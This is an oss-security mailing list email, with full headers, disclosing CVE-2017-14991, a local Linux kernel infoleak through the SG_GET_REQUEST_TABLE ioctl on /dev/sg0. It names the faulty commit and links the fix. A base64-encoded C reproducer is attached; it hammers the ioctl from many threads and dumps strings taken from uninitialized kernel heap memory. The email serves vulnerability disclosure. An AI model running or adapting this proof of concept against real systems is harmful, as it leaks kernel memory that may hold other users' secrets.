X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3440" "Monday" "9" "October" "2017" "11:12:08" "+0200" "Alexander Potapenko" "glider@google.com" "<CAG_fn=WuQgi2dWQesBdAzYEvRGWbLU97qdGMAjiyWkbCEX=bRQ@mail.gmail.com>" "74" "[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0" nil nil nil "10" "2017100909:12:08" "[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0" (number mark "U       glider@googl Oct  9   74/3440  " thread-indent "\"[oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15415 invoked by uid 550); 9 Oct 2017 09:12:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15394 invoked from network); 9 Oct 2017 09:12:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=x59oagc8dorc6w4HVRsuxkqcFDtohUG7MNGXMK5csxE=;
        b=jb8VFZcbvK5Ky+b628cKvne4kz37AyblgaML1shQ+brPh9g/rI+TLjD9koPSbDME04
         ukS0SWbc6fmYdDQlu2AVbW2Oltj8gHVS6jq6Bd7a/jCdrAz7eCostkJZ3qJTPWSCaWMx
         HukMsCpK7UXRUNdDlNQh9aNgihSyp19/9LG/+m8WTP1Xl1iP6aoMKrAIFuAKV/AOzjzC
         DDccMbCy1sOCt22uieOOTsx6HWKFBxHNpFmwHWtwqjdHMTVJo8EYzvaLt3TjCFrrKY0Y
         taYoCMkD3HbbjB6EWv9K/z5l5sQnCiD++DisMTT/fnoaJJV1kV4OQBlJgcupDZi4DfE8
         hVYA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=x59oagc8dorc6w4HVRsuxkqcFDtohUG7MNGXMK5csxE=;
        b=fGZZsTSG5L7HZbsffUKIptQuRNwSi6Ga9EsZwFr8eMcde0IzwevoNX5f02rJT0W1H0
         llBt4WV6ZNsHwS34SStC/NYVF5Z2bVqtcuJmuPUYxJHmVXjIjEeThekIc2rxqhZI6X3g
         idy6gZiFNR84p4N5lUmAscipP9gwNmNHmZQCRnZ5zujHIjFC3bWom5FeNxRXyUZV7jYj
         lSB5i12DXvuPQI/rtUX8MgkzWsNrkuxXTViKGJrVXzSCZKZTOnrPJENNCnY2i3TSNpml
         hhpcnMooKfQtRwI3P8qYAvL4mL8DBt4IQ1tXX//pZ5LsQ5wF4TFkAoJdCux1ty7BlGui
         5RwQ==
X-Gm-Message-State: AMCzsaXrroGNJunuY6h7lbvlzIDxsEXE7RmBMfqWDNiByIFUrCc/uLsF
	IppGpIJa5IUXcV/BxGZBHekEozMX6DRe/BqTaNuwAttrv5o=
X-Google-Smtp-Source: AOwi7QAHpZQfcweDPXGvg/nFelLmiTUPbLWQUgg/vh/PxQ3pjwUeSmBTerl5GN6SqDWoHsA1lKLj9oQgQ6MKhl35ikU=
X-Received: by 10.31.175.205 with SMTP id y196mr4171142vke.35.1507540329762;
 Mon, 09 Oct 2017 02:12:09 -0700 (PDT)
MIME-Version: 1.0
From: Alexander Potapenko <glider@google.com>
Date: Mon, 9 Oct 2017 11:12:08 +0200
Message-ID: <CAG_fn=WuQgi2dWQesBdAzYEvRGWbLU97qdGMAjiyWkbCEX=bRQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="001a1144077ad9c25b055b199567"
Subject: [oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an
 SG_GET_REQUEST_TABLE ioctl call for /dev/sg0

--001a1144077ad9c25b055b199567
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hello,

Kernel commit 109bade9c625c89bb5ea753aaa1a0a97e6fbb548 has introduced
an infoleak which manifests when the SG_GET_REQUEST_TABLE ioctl is
called for /dev/sg0 (see the attached repro).
The bug allows local users to obtain sensitive information from
uninitialized kernel heap-memory locations. Linux kernels before
4.13.4 are affected.
The bug has been found with syzkaller and KMSAN, upstream fix is here:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?=
id=3D3e0097499839e0fe3af380410eababe5a47c4cf9

--=20
Alexander Potapenko
Software Engineer

Google Germany GmbH
Erika-Mann-Stra=C3=9Fe, 33
80636 M=C3=BCnchen

Gesch=C3=A4ftsf=C3=BChrer: Paul Manicle, Halimah DeLaine Prado
Registergericht und -nummer: Hamburg, HRB 86891
Sitz der Gesellschaft: Hamburg

--001a1144077ad9c25b055b199567
Content-Type: text/x-csrc; charset="US-ASCII"; name="sg_ioctl.c"
Content-Disposition: attachment; filename="sg_ioctl.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_j8jyj8ka0

I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNs
dWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxz
dHJpbmcuaD4KI2luY2x1ZGUgPHB0aHJlYWQuaD4KI2luY2x1ZGUgPHN5cy9z
eXNjYWxsLmg+CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8dW5p
c3RkLmg+CiNpbmNsdWRlIDxzY3NpL3NnLmg+CgpwdGhyZWFkX211dGV4X3Qg
b3V0X211dGV4ID0gUFRIUkVBRF9NVVRFWF9JTklUSUFMSVpFUjsKCmludCBt
aW5fc3RybGVuID0gMjQ7Cgp2b2lkIGR1bXBfYnVmKHVuc2lnbmVkIGNoYXIg
KmJ1ZiwgaW50IGxlbikgewogIGludCBpLCBueiA9IDA7CiAgZm9yIChpID0g
MDsgaSA8IGxlbjsgaSsrKSB7CiAgICBpZiAoYnVmW2ldKSB7CiAgICAgIG56
ID0gMTsKICAgICAgYnJlYWs7CiAgICB9CiAgfQogIGlmICghbnopIHsKICAg
IC8vIFRoZSBidWZmZXIgaXMgZW1wdHkuCiAgICByZXR1cm47CiAgfQogIHB0
aHJlYWRfbXV0ZXhfbG9jaygmb3V0X211dGV4KTsKICBmb3IgKGkgPSAwOyBp
IDwgbGVuOyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgaW50IHN0
cl9sZW4gPSBzdHJsZW4oJmJ1ZltpXSk7CiAgICAgIC8vIFNob3J0IHN0cmlu
ZyBwaWVjZXMgYXJlIHRvbyBib3JpbmcuCiAgICAgIGlmIChzdHJfbGVuID49
IG1pbl9zdHJsZW4pIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpjOwogICAg
ICAgIGZvciAoYyA9ICZidWZbaV07IGMgPCAmYnVmW2kgKyBzdHJfbGVuXTsg
YysrKSB7CiAgICAgICAgICBpZiAoKCpjID4gMTI3KSB8fCAoKCpjIDwgMzIp
ICYmICgqYyAhPSAxMCkgJiYgKCpjICE9IDEzKSkpICB7CiAgICAgICAgICAg
ICpjID0gJyAnOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgIH0K
ICAgICAgICB9CiAgICAgICAgLy8gRHVtcCB0aGUgYnVmZmVyLgogICAgICAg
IGZwcmludGYoc3RkZXJyLCAiJyVzJ1xuIiwgJmJ1ZltpXSk7CiAgICAgIH0K
ICAgICAgaSArPSBzdHJfbGVuOwogICAgfQogIH0KICBwdGhyZWFkX211dGV4
X3VubG9jaygmb3V0X211dGV4KTsKfQoKaW50IGRldjsKdm9pZCAqZG9fd29y
ayh2b2lkICpfKSB7CiAgdm9pZCAqbWVtID0gbW1hcCgwLCAweDEwMDAsIFBS
T1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9QUklWQVRFIHwgTUFQX0FOT05Z
TU9VUywgLTEsIDApOwogIGlvY3RsKGRldiwgU0dfR0VUX1JFUVVFU1RfVEFC
TEUsIG1lbSk7CiAgZHVtcF9idWYobWVtLCBzaXplb2Yoc2dfcmVxX2luZm9f
dCkgKiBTR19NQVhfUVVFVUUpOwogIG11bm1hcChtZW0sIDB4MTAwMCk7Cn0K
CiNkZWZpbmUgTlVNX1RIUkVBRFMgMTYKCmludCBtYWluKCkKewogIGludCBp
LCBqOwogIHB0aHJlYWRfdCB0aHJbTlVNX1RIUkVBRFNdOwoKICBkZXYgPSBv
cGVuKCIvZGV2L3NnMCIsIE9fUkRPTkxZKTsKICBpZiAoZGV2ID09IC0xKQog
ICAgcmV0dXJuIDE7CiAgZm9yIChpID0gMDsgaSA8IDEwMDAwMDsgaSsrKSB7
CiAgICBmb3IgKGogPSAwOyBqIDwgTlVNX1RIUkVBRFM7IGorKykgewogICAg
ICBwdGhyZWFkX2NyZWF0ZSgmdGhyW2pdLCBOVUxMLCBkb193b3JrLCBOVUxM
KTsKICAgIH0KICAgIGZvciAoaiA9IDA7IGogPCBOVU1fVEhSRUFEUzsgaisr
KSB7CiAgICAgIHB0aHJlYWRfam9pbih0aHJbal0sIE5VTEwpOwogICAgfQog
IH0KICByZXR1cm4gMDsKfQoK

--001a1144077ad9c25b055b199567--
